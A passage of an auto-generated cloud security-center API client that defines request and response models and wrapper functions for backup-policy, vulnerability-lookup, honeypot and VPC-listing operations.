      agentStatus?: string(name='AgentStatus', example='INSTALLED'),
      databaseName?: string(name='DatabaseName', example='abc123'),
      databaseType?: string(name='DatabaseType', example='MYSQL'),
      errorCode?: string(name='ErrorCode', example='EXPIRED'),
      errorMessage?: string(name='ErrorMessage', example='AttachRamRoleError'),
      instanceId?: string(name='InstanceId', example='i-9dp7mubt5wit6g0h****'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      instanceStatus?: string(name='InstanceStatus', example='Running'),
      instanceUuid?: string(name='InstanceUuid', example='cf1bcad4063f11ed800000163e0e****'),
      latestBackResult?: string(name='LatestBackResult'),
      latestBackupTime?: string(name='LatestBackupTime', example='2022-01-01 00:00:11'),
      planStatus?: string(name='PlanStatus', example='creating'),
      policyId?: long(name='PolicyId', example='123'),
      policyName?: string(name='PolicyName', example='auto_oracle_37f'),
      policyStatus?: string(name='PolicyStatus', example='opening'),
      uniRegionId?: string(name='UniRegionId', example='cn-hangzhou'),
    }
  ](name='UniBackupPolicies'),
}

model DescribeUniBackupPoliciesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupPoliciesResponseBody(name='body'),
}

async function describeUniBackupPoliciesWithOptions(request: DescribeUniBackupPoliciesRequest, runtime: Util.RuntimeOptions): DescribeUniBackupPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupPolicies(request: DescribeUniBackupPoliciesRequest): DescribeUniBackupPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupPoliciesWithOptions(request, runtime);
}

model DescribeUniBackupPolicyDetailRequest {
  policyId?: string(name='PolicyId', example='123'),
}

model DescribeUniBackupPolicyDetailResponseBody = {
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  uniBackupPolicyDTO?: {
    accountName?: string(name='AccountName', example='admin'),
    agentStatus?: string(name='AgentStatus', example='INSTALLED'),
    databaseType?: string(name='DatabaseType', example='ORACLE'),
    fullPlan?: {
      days?: [ string ](name='Days'),
      interval?: int32(name='Interval', example='2'),
      planType?: string(name='PlanType', example='daily'),
      startTime?: string(name='StartTime', example='00:10:00'),
    }(name='FullPlan'),
    incPlan?: {
      days?: [ string ](name='Days'),
      interval?: int32(name='Interval', example='2'),
      planType?: string(name='PlanType', example='daily'),
      startTime?: string(name='StartTime', example='00:10:00'),
    }(name='IncPlan'),
    instanceId?: string(name='InstanceId', example='i-2zefcy2id5d60m9t****'),
    instanceName?: string(name='InstanceName', example='sql-test-01'),
    policyId?: long(name='PolicyId', example='123'),
    policyName?: string(name='PolicyName', example='auto_test_sql'),
    policyStatus?: string(name='PolicyStatus', example='opening'),
    retention?: int32(name='Retention', example='7'),
    speedLimiter?: long(name='SpeedLimiter', example='5242880'),
  }(name='UniBackupPolicyDTO'),
}

model DescribeUniBackupPolicyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupPolicyDetailResponseBody(name='body'),
}

async function describeUniBackupPolicyDetailWithOptions(request: DescribeUniBackupPolicyDetailRequest, runtime: Util.RuntimeOptions): DescribeUniBackupPolicyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupPolicyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupPolicyDetail(request: DescribeUniBackupPolicyDetailRequest): DescribeUniBackupPolicyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupPolicyDetailWithOptions(request, runtime);
}

model DescribeUniRecoverableListRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  database?: string(name='Database', example='msdb'),
  pageSize?: int32(name='PageSize', example='20'),
  policyId?: long(name='PolicyId', example='123'),
}

model DescribeUniRecoverableListResponseBody = {
  count?: int32(name='Count', example='20'),
  currentPage?: int32(name='CurrentPage', example='1'),
  database?: string(name='Database', example='msdb'),
  pageSize?: int32(name='PageSize', example='20'),
  recoverableInfoList?: [ 
    {
      firstTime?: long(name='FirstTime', example='1671468180000'),
      lastTime?: long(name='LastTime', example='1671468180000'),
      resetScn?: string(name='ResetScn', example='4529940.0'),
      resetTime?: long(name='ResetTime', example='2021-01-30 08:04:36'),
      restoreInfo?: string(name='RestoreInfo', example='{
      "files": {
            "qtc": "F:\\\\database\\\\qtc.mdf",
            "qtc_log": "F:\\\\database\\\\qtc_0.ldf"
      },
      "name": "qtc"
}'),
    }
  ](name='RecoverableInfoList'),
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  totalCount?: int32(name='TotalCount', example='23'),
}

model DescribeUniRecoverableListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniRecoverableListResponseBody(name='body'),
}

async function describeUniRecoverableListWithOptions(request: DescribeUniRecoverableListRequest, runtime: Util.RuntimeOptions): DescribeUniRecoverableListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.database)) {
    query['Database'] = request.database;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniRecoverableList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniRecoverableList(request: DescribeUniRecoverableListRequest): DescribeUniRecoverableListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniRecoverableListWithOptions(request, runtime);
}

model DescribeUniSupportRegionResponseBody = {
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  uniSupportRegion?: [ string ](name='UniSupportRegion'),
}

model DescribeUniSupportRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniSupportRegionResponseBody(name='body'),
}

async function describeUniSupportRegionWithOptions(runtime: Util.RuntimeOptions): DescribeUniSupportRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUniSupportRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniSupportRegion(): DescribeUniSupportRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniSupportRegionWithOptions(runtime);
}

model DescribeUserBackupMachinesResponseBody = {
  machines?: [ 
    {
      id?: long(name='Id', description='The ID of the anti-ransomware policy that is applied to the server.', example='123'),
      policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy that is applied to the server.', example='policy_name_A'),
      uuid?: string(name='Uuid', description='The UUID of the server to which the anti-ransomware policy is applied.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
  ](name='Machines', description='An array consisting of the servers to which the anti-ransomware policy is applied.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model DescribeUserBackupMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserBackupMachinesResponseBody(name='body'),
}

async function describeUserBackupMachinesWithOptions(runtime: Util.RuntimeOptions): DescribeUserBackupMachinesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUserBackupMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserBackupMachines(): DescribeUserBackupMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserBackupMachinesWithOptions(runtime);
}

model DescribeUserBaselineAuthorizationRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId', description='The ID of the asset owner.', example='1519712934213764'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
}

model DescribeUserBaselineAuthorizationResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='0AF20EB0-EBBC-4B94-9B84-F3BAFAC53EDE'),
  userBaselineAuthorization?: {
    status?: int32(name='Status', description='Indicates whether Security Center is authorized to run configuration checks on cloud services.

*   **0**: no. Security Center is not authorized to run configuration checks on cloud services.
*   **1**: yes. Security Center is authorized to run configuration checks on cloud services.', example='1'),
  }(name='UserBaselineAuthorization', description='The information about whether Security Center is authorized to run configuration checks on cloud services.'),
}

model DescribeUserBaselineAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserBaselineAuthorizationResponseBody(name='body'),
}

async function describeUserBaselineAuthorizationWithOptions(request: DescribeUserBaselineAuthorizationRequest, runtime: Util.RuntimeOptions): DescribeUserBaselineAuthorizationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUserBaselineAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserBaselineAuthorization(request: DescribeUserBaselineAuthorizationRequest): DescribeUserBaselineAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserBaselineAuthorizationWithOptions(request, runtime);
}

model DescribeUserLayoutAuthorizationRequest {
  lang?: string(name='Lang'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeUserLayoutAuthorizationResponseBody = {
  authorized?: boolean(name='Authorized'),
  requestId?: string(name='RequestId'),
}

model DescribeUserLayoutAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserLayoutAuthorizationResponseBody(name='body'),
}

async function describeUserLayoutAuthorizationWithOptions(request: DescribeUserLayoutAuthorizationRequest, runtime: Util.RuntimeOptions): DescribeUserLayoutAuthorizationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUserLayoutAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserLayoutAuthorization(request: DescribeUserLayoutAuthorizationRequest): DescribeUserLayoutAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserLayoutAuthorizationWithOptions(request, runtime);
}

model DescribeUuidsByVulNamesRequest {
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

**y**: yes. **n**: no.', example='n'),
  fieldName?: string(name='FieldName', description='The name of the search field that is used to query containers.', example='namespace'),
  fieldValue?: string(name='FieldValue', description='The value of the search field that is used to query containers.', example='cas-adad-qeqwe'),
  groupId?: long(name='GroupId', description='The ID of the asset group.', example='11286014'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  level?: string(name='Level', description='The severity of the vulnerability. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high,low'),
  necessity?: string(name='Necessity', description='The priority based on which the vulnerability is fixed. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset. Fuzzy match is supported.', example='10.7.'),
  searchTags?: string(name='SearchTags', description='The tags that are used to search for the vulnerability.', example='oval'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Separate multiple states with commas (,). Valid values:

*   **1**: unfixed
*   **4**: being fixed
*   **7**: fixed', example='1,4'),
  tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the ID of the asset', example='uuid'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerability
*   **emg**: urgent vulnerabilities
*   **sca**: vulnerabilities that are detected based on software component analysis', example='cve'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerability is detected. Separate multiple IDs with commas (,).', example='vpc-uf6ssrvbrwe37ekw****,vpc-bp1aevy8sofi8mh1q****'),
  vulNames?: [ string ](name='VulNames', description='An array that consists of the names of vulnerabilities.

>  You can call the [DescribeGroupedVul](~~DescribeGroupedVul~~) operation to obtain the names of vulnerabilities.'),
}

model DescribeUuidsByVulNamesResponseBody = {
  machineInfoStatistics?: [ 
    {
      machineInstanceId?: string(name='MachineInstanceId', description='The ID of the server.', example='i-wz9gd1os5talju****'),
      machineIp?: string(name='MachineIp', description='The IP address of the server.', example='192.168.XX.XX'),
      machineName?: string(name='MachineName', description='The name of the server.', example='TestMachine'),
      os?: string(name='Os', description='The name of the operating system that the server runs.', example='windows'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='18375c64-eaa2-4702-92b0-4ee7******'),
    }
  ](name='MachineInfoStatistics', description='An array that consists of the statistics about the assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='97286A-4A6B-4A4-95FA-EC7E3E2451'),
}

model DescribeUuidsByVulNamesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUuidsByVulNamesResponseBody(name='body'),
}

async function describeUuidsByVulNamesWithOptions(request: DescribeUuidsByVulNamesRequest, runtime: Util.RuntimeOptions): DescribeUuidsByVulNamesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.level)) {
    query['Level'] = request.level;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUuidsByVulNames',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUuidsByVulNames(request: DescribeUuidsByVulNamesRequest): DescribeUuidsByVulNamesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUuidsByVulNamesWithOptions(request, runtime);
}

model DescribeVendorListResponseBody = {
  requestId?: string(name='RequestId'),
  vendorNameList?: [ string ](name='VendorNameList'),
}

model DescribeVendorListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVendorListResponseBody(name='body'),
}

async function describeVendorListWithOptions(runtime: Util.RuntimeOptions): DescribeVendorListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVendorList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVendorList(): DescribeVendorListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVendorListWithOptions(runtime);
}

model DescribeVersionConfigRequest {
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeVersionConfigResponseBody = {
  allowPartialBuy?: int32(name='AllowPartialBuy'),
  appWhiteList?: int32(name='AppWhiteList'),
  appWhiteListAuthCount?: long(name='AppWhiteListAuthCount'),
  assetLevel?: int32(name='AssetLevel'),
  highestVersion?: int32(name='HighestVersion'),
  honeypotCapacity?: long(name='HoneypotCapacity'),
  imageScanCapacity?: long(name='ImageScanCapacity'),
  instanceId?: string(name='InstanceId'),
  isNewContainerVersion?: boolean(name='IsNewContainerVersion'),
  isOverBalance?: boolean(name='IsOverBalance'),
  isTrialVersion?: int32(name='IsTrialVersion'),
  lastTrailEndTime?: long(name='LastTrailEndTime'),
  MVAuthCount?: int32(name='MVAuthCount'),
  MVUnusedAuthCount?: int32(name='MVUnusedAuthCount'),
  openTime?: long(name='OpenTime'),
  releaseTime?: long(name='ReleaseTime'),
  requestId?: string(name='RequestId'),
  sasLog?: int32(name='SasLog'),
  sasScreen?: int32(name='SasScreen'),
  slsCapacity?: long(name='SlsCapacity'),
  threatAnalysisCapacity?: long(name='ThreatAnalysisCapacity'),
  userDefinedAlarms?: int32(name='UserDefinedAlarms'),
  version?: int32(name='Version'),
  vmCores?: int32(name='VmCores'),
  webLock?: int32(name='WebLock'),
  webLockAuthCount?: long(name='WebLockAuthCount'),
}

model DescribeVersionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVersionConfigResponseBody(name='body'),
}

async function describeVersionConfigWithOptions(request: DescribeVersionConfigRequest, runtime: Util.RuntimeOptions): DescribeVersionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVersionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVersionConfig(request: DescribeVersionConfigRequest): DescribeVersionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVersionConfigWithOptions(request, runtime);
}

model DescribeVpcHoneyPotCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.', example='vpcRegionId'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: You must manually enter the search condition.
*   **select**: You must select a search condition from the **Values** drop-down list.', example='select'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is **select**.

>  If the value of **Type** is **input**, the value of this parameter is an empty string.', example='ap-southeast-2,eu-west-1'),
    }
  ](name='CriteriaList', description='An array consisting of the search conditions that can be used to query honeypots.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FCE38ADB-7361-4212-AD87-A4514E4DF925'),
}

model DescribeVpcHoneyPotCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcHoneyPotCriteriaResponseBody(name='body'),
}

async function describeVpcHoneyPotCriteriaWithOptions(runtime: Util.RuntimeOptions): DescribeVpcHoneyPotCriteriaResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVpcHoneyPotCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVpcHoneyPotCriteria(): DescribeVpcHoneyPotCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcHoneyPotCriteriaWithOptions(runtime);
}

model DescribeVpcHoneyPotListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='2'),
  honeyPotExistence?: boolean(name='HoneyPotExistence', description='Specifies whether the cloud honeypot feature is enabled for the VPC. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  vpcId?: string(name='VpcId', description='The ID of the VPC on which the honeypot is deployed.

>  You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the IDs of VPCs.', example='vpc-d7o009q63fqy21r8u****'),
  vpcName?: string(name='VpcName', description='The name of the VPC.

>  You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the names of VPCs.', example='abcnet'),
  vpcRegionId?: string(name='VpcRegionId', description='The region ID of the VPC.

>  You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the region IDs of VPCs.', example='ap-southeast-2'),
}

model DescribeVpcHoneyPotListResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4FEC7F58-FCDA-415F-AE25-CD8BC0931DF2'),
  vpcHoneyPotDTOList?: [ 
    {
      cidrBlock?: string(name='CidrBlock', description='The CIDR block of the VPC.', example='192.168.XX.XX/16'),
      createTime?: long(name='CreateTime', description='The time when the VPC was created. Unit: milliseconds.', example='1607365213000'),
      honeyPotEcsInstanceStatus?: string(name='HoneyPotEcsInstanceStatus', description='The status of the server on which the honeypot is deployed. Valid values:

*   **Pending**: The server is being created.
*   **Running**: The server is running.
*   **Starting**: The server is being started.
*   **Stopping**: The server is being stopped.
*   **Stopped**: The server is stopped.', example='Running'),
      honeyPotEniInstanceId?: string(name='HoneyPotEniInstanceId', description='The ID of the elastic network interface (ENI) used by the honeypot in the VPC.', example='eni-p0whwgg7bing8b80****'),
      honeyPotExistence?: boolean(name='HoneyPotExistence', description='Indicates whether the cloud honeypot feature is enabled for the VPC. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      honeyPotInstanceStatus?: string(name='HoneyPotInstanceStatus', description='The status of the honeypot. Valid values:

*   **pending**: The honeypot is being created.
*   **deleting**: The honeypot is being deleted.
*   **off**: The honeypot is disabled.
*   **suspending**: The honeypot is suspended.
*   **on**: The honeypot is enabled.', example='on'),
      honeyPotVpcSwitchId?: string(name='HoneyPotVpcSwitchId', description='The ID of the vSwitch to which the ENI used by the honeypot is connected.', example='vsw-p0w7gdcfvn20tvdul****'),
      vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-p0w223apdl49sr5zv****'),
      vpcName?: string(name='VpcName', description='The name of the VPC.', example='abc-vpcname'),
      vpcRegionId?: string(name='VpcRegionId', description='The region ID of the VPC.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='ap-southeast-2'),
      vpcStatus?: string(name='VpcStatus', description='The status of the VPC. Valid values:

*   **Available**: The VPC is normal and available.
*   **Pending**: The VPC is being configured.', example='Available'),
      vpcSwitchIdList?: [ 
        {
          vpcSwitchId?: string(name='VpcSwitchId', description='The ID of the vSwitch.', example='vsw-p0wdnyv4wzp6jkuu4****'),
          vpcSwitchName?: string(name='VpcSwitchName', description='The name of the vSwitch.', example='abc01'),
          zoneId?: string(name='ZoneId', description='The zone ID of the vSwitch.', example='ap-southeast-2b'),
        }
      ](name='VpcSwitchIdList', description='An array that consists of the vSwitches in the VPC.'),
    }
  ](name='VpcHoneyPotDTOList', description='An array that consists of the honeypots.'),
}

model DescribeVpcHoneyPotListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcHoneyPotListResponseBody(name='body'),
}

/**
  * If you specify only the Action request parameter in your request, Security Center returns the list of all virtual private clouds (VPCs) regardless of whether a honeypot is deployed on a VPC.
  *
  * @param request DescribeVpcHoneyPotListRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeVpcHoneyPotListResponse
 */
async function describeVpcHoneyPotListWithOptions(request: DescribeVpcHoneyPotListRequest, runtime: Util.RuntimeOptions): DescribeVpcHoneyPotListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeyPotExistence)) {
    query['HoneyPotExistence'] = request.honeyPotExistence;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  if (!Util.isUnset(request.vpcName)) {
    query['VpcName'] = request.vpcName;
  }
  if (!Util.isUnset(request.vpcRegionId)) {
    query['VpcRegionId'] = request.vpcRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVpcHoneyPotList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * If you specify only the Action request parameter in your request, Security Center returns the list of all virtual private clouds (VPCs) regardless of whether a honeypot is deployed on a VPC.
  *
  * @param request DescribeVpcHoneyPotListRequest
  * @return DescribeVpcHoneyPotListResponse
 */
async function describeVpcHoneyPotList(request: DescribeVpcHoneyPotListRequest): DescribeVpcHoneyPotListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcHoneyPotListWithOptions(request, runtime);
}

model DescribeVpcListResponseBody = {
  count?: int32(name='Count', description='The total number of entries returned.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  vpcList?: [ 
    {
      ecsCount?: int32(name='EcsCount', description='The number of ECS instances.', example='9'),
      instanceDesc?: string(name='InstanceDesc', description='The information about the VPC.', example='TestVpcNote'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='ins_1321_asedb_ada'),
      instanceName?: string(name='InstanceName', description='The name of the VPC.', example='test'),
      regionId?: string(name='RegionId', description='The region in which the ECS instance resides.', example='cn-hangzhou'),
    }
  ](name='VpcList', description='An array that consists of VPCs.'),
}

model DescribeVpcListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcListResponseBody(name='body'),
}

